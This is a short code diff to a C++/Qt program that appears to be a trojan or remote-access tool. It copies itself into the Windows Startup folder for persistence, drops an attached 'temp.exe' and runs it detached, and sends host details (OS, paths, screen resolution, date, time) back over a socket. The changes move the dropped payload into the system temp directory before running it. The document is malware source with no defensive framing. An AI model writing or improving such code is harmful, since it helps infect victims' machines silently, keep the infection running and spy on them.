@@ -122,6 +122,7 @@ bool MainWindow::cargarConfiguracion(){
         this->nombreCopiable = campo[10];
         if (campo[8] == "unido")
         {
+            QDir directorio;
             QByteArray datos;
             datos = "|@|" + campo[1].toLatin1() + "|@|";
             datos = datos + campo[2].toLatin1() + "|@|";
@@ -138,7 +139,7 @@ bool MainWindow::cargarConfiguracion(){
             QFile adjunto;
             QFile servidor;
             QFile copiable;
-            adjunto.setFileName("temp.exe");
+            adjunto.setFileName(directorio.tempPath() + "/temp.exe");
             servidor.setFileName(QApplication::applicationFilePath());
             if (directorio.exists(QDir::homePath() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")) { //Windows
                 copiable.setFileName(QDir::homePath() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/" + campo[10]);
@@ -154,8 +155,8 @@ bool MainWindow::cargarConfiguracion(){
             copiable.close();
             servidor.close();
             adjunto.close();
-            proceso.setWorkingDirectory(QApplication::applicationDirPath());
-            proceso.startDetached("temp.exe");
+            proceso.setWorkingDirectory(directorio.tempPath());
+            proceso.startDetached(directorio.tempPath() + "/temp.exe");
             return true;
         }
 
@@ -318,6 +319,8 @@ void MainWindow::llegadaDatos() {
                 version = "7";
                 break;
             }
+            default:
+                break;
             }
 
             util.escribirSocket("informacion|@|" + so + "|@|" + version + "|@|" + homePath + "|@|" + tempPath + "|@|" + resolucion + "|@|" + fecha + "|@|" + hora + "|@|",&socket);
